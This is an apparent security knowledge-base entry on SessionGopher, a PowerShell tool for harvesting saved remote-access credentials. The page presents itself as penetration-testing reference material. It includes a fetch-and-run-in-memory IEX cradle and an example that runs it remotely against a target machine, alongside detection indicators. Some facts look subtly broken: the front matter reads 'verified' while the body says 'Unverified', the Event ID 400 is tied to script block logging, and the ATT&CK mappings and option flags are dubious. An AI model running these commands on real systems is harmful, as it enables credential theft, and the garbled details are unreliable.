---
id: a9748843-6c43-4c27-9223-09e7406fcf0a
type: tool
description: >-
  PowerShell tool for enumerating saved credentials and session information from
  remote access applications like PuTTY, WinSCP, FileZilla, and Microsoft Remote
  Desktop.
url: 'https://github.com/fireeye/SessionGopher'
verified: true
created_at: '2019-08-28T21:17:38.410160+00:00'
updated_at: '2023-05-29T16:48:53.029709+00:00'
tags:
  - credential-access
  - powershell
  - enumeration
  - credential-dumping
platforms:
  - Windows
commands:
  - '[[commands/sessiongopher-download-execute-local]]'
  - '[[commands/sessiongopher-remote-execute]]'
validated: true
---

# SessionGopher

**Status**: Unverified

## Overview

SessionGopher is a PowerShell module designed to enumerate saved session credentials from various remote access tools on Windows systems. It targets applications such as PuTTY, WinSCP, SuperPuTTY, FileZilla, and Microsoft Remote Desktop, extracting connection details, usernames, and potentially encrypted passwords. This tool is commonly used in penetration testing for credential access during post-exploitation phases.

## Description

SessionGopher leverages Windows Management Instrumentation (WMI) and registry queries to gather saved session data without requiring administrative privileges in many cases. It can be executed locally on the target or remotely via PowerShell remoting. The output includes details like hostnames, ports, usernames, and password hashes where available, which can be further cracked offline. It supports both interactive and non-interactive modes, making it suitable for automated red team operations.

## Features

- Extracts session data from PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP.
- Supports local and remote execution.
- Outputs data in a structured format for easy parsing (e.g., CSV or console).
- Handles encrypted credentials and provides guidance on cracking them.
- Minimal dependencies, runs in pure PowerShell environments.

## Installation

### Requirements

- PowerShell 2.0 or later (Windows 7+).
- .NET Framework 2.0+.
- No additional installations needed beyond downloading the script.

### Install Commands

SessionGopher is a single PowerShell script and does not require traditional installation. Download it directly:

```powershell
# Download from GitHub
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/fireeye/SessionGopher/master/SessionGopher.ps1' -OutFile 'SessionGopher.ps1'

# Or load directly into memory (no file saved)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fireeye/SessionGopher/master/SessionGopher.ps1')
```

On Kali Linux or other non-Windows systems, use it via Wine or a Windows VM for testing.

## Basic Usage

```powershell
Invoke-SessionGopher
```

### Common Options

| Option | Description |
|--------|-------------|
| `-u <username>` | Specify a username to filter sessions. |
| `-c <computername>` | Target a remote computer (requires PSRemoting). |
| `-q` | Quiet mode, suppresses non-essential output. |
| `-f <format>` | Output format (e.g., CSV, JSON). |
| `-All` | Enumerate all supported applications. |

## Examples

### Example 1: Basic Local Usage

Execute locally to enumerate all sessions:

```powershell
Invoke-SessionGopher -All
```

### Example 2: Remote Execution

Run on a remote target (requires PSRemoting enabled and credentials):

```powershell
Invoke-Command -ComputerName TARGET-PC -Credential (Get-Credential) -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fireeye/SessionGopher/master/SessionGopher.ps1'); Invoke-SessionGopher -All }
```

### Example 3: Filtered Output to File

Save results to CSV:

```powershell
Invoke-SessionGopher -All | Export-Csv -Path sessions.csv -NoTypeInformation
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Credentials from Web Browsers]] Credentials from Web Browsers (adapted for remote apps).
- [[LSASS Memory]] LSASS Memory (for credential extraction patterns).
- [[Process Discovery]] Process Discovery (via WMI queries).

### Tactics

- [[Credential Access]] Credential Access.
- [[Discovery]] Discovery.

## Detection

Indicators and methods for detecting this tool's usage:

- PowerShell execution logs showing downloads from GitHub raw URLs or script imports.
- WMI queries to registry paths like HKCU:\Software\SimonTatham\PuTTY\Sessions.
- Unexpected file creations or network connections during credential enumeration.
- Event ID 400 in Windows PowerShell logs for script block execution.
- Monitor for processes spawning from powershell.exe accessing remote app configs.

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Mimikatz]] (for broader credential dumping).
- [[tools/LaZagne]] (cross-platform credential extractor).
- [[tools/PowerSploit]] (suite including similar modules).

## References

- Official GitHub Repository: https://github.com/fireeye/SessionGopher
- FireEye Blog Post: https://www.fireeye.com/blog/threat-research/2018/03/sessiongopher.html
- MITRE ATT&CK: https://attack.mitre.org/techniques/T1555/
